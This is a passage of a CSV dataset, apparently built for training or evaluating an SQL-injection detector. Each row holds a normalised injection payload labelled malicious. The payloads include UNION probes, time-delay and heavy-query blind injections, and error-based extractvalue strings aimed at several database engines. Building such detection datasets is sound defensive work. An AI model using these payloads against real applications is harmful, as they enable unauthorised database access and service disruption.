row_index,payload_norm,label,sqli_type_hint
9510,"1%"" union all select null,null,null,null,null--",1,
9511,"call regexp_substring ( repeat ( right ( char ( 3702 ) ,0 ) ,500000000 ) ,null ) and ( 'cixa' like 'cixa",1,
9512,"1"" ) as ufai where 9673 = 9673",1,
9513,"1"" where 2072 = 2072 or 7427 = dbms_pipe.receive_message ( chr ( 116 ) ||chr ( 87 ) ||chr ( 90 ) ||chr ( 109 ) ,5 ) --",1,
9514,"-8203 ) ) as eqlf where 6132 = 6132 union all select 6132,6132,6132,6132,6132,6132,6132,6132,6132--",1,
9515,1 ) ) as pxmz where 2596 = 2596,1,
9516,"1' ) ) or 2367 = ( select count ( * ) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 ) --",1,
9517,"1', ( select ( case when ( 5586 = 6403 ) then 1 else 5586* ( select 5586 from mysql.db ) end ) )",1,
9518,-6039%' ) ) or 6872 = 6872 and ( ( '%' = ',1,
9519,"1"" ) as yzny where 4869 = 4869 rlike ( select * from ( select ( sleep ( 5 ) ) ) sgvo ) --",1,
9520,1 ) where 1487 = 1487,1,
9521,1'|| ( select 'abjv' from dual where 4200 = 4200,1,
9522,"1%"" ) ) ) and 8312 = dbms_pipe.receive_message ( chr ( 69 ) ||chr ( 79 ) ||chr ( 101 ) ||chr ( 68 ) ,5 ) --",1,
9523,"select * from generate_series ( 6730,6730,case when ( 6730 = 9431 ) then 1 else 0 end ) limit 1--",1,
9524,"1'+ ( select immd where 7499 = 7499 union all select null,null,null,null,null,null,null,null#",1,
9525,"1 and 5556 = ( select count ( * ) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 )",1,
9526,1' ) where 8128 = 8128,1,
9527,"-1333"" ) ) union all select 2376,2376,2376,2376,2376,2376,2376,2376,2376--",1,
9528,1 ) as ktfu where 2637 = 2637,1,
9529,1'+ ( select nash where 4159 = 4159 union all select null#,1,
9530,"1%"" ) and ( select * from ( select ( sleep ( 5 ) ) ) fzno ) and ( ""%"" = """,1,
9531,"-8143 union all select 4492,4492,4492,4492,4492,4492,4492,4492,4492#",1,
9532,"-9762 ) or elt ( 5773 = 8986,8986 )",1,
9533,"1%' or 7417 = ( select count ( * ) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 ) --",1,
9534,"select dbms_pipe.receive_message ( chr ( 66 ) ||chr ( 67 ) ||chr ( 79 ) ||chr ( 101 ) ,5 ) from dual and ( ( 'fnna' = 'fnna",1,
9535,select ( case when ( 7822 = 4430 ) then 7822 else 1/ ( select 0 ) end ) --,1,
9536,"1' ) ( select ( case when ( 5451 = 5451 ) then regexp_substring ( repeat ( right ( char ( 5451 ) ,0 ) ,500000000 ) ,null ) else char ( 108 ) ||char ( 76 ) ||char ( 112 ) ||char ( 116 ) end ) from information_schema.system_users )",1,
9537,"-9630%"" union all select 8592,8592,8592,8592--",1,
9538,"1 and 6414 = ( select count ( * ) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 )",1,
9539,"1"" ) ) procedure analyse ( extractvalue ( 5840,concat ( 0x5c,0x7171706a71, ( select ( case when ( 5840 = 5840 ) then 1 else 0 end ) ) ,0x717a767a71 ) ) ,1 ) and ( ( ""rtyu"" like ""rtyu",1,
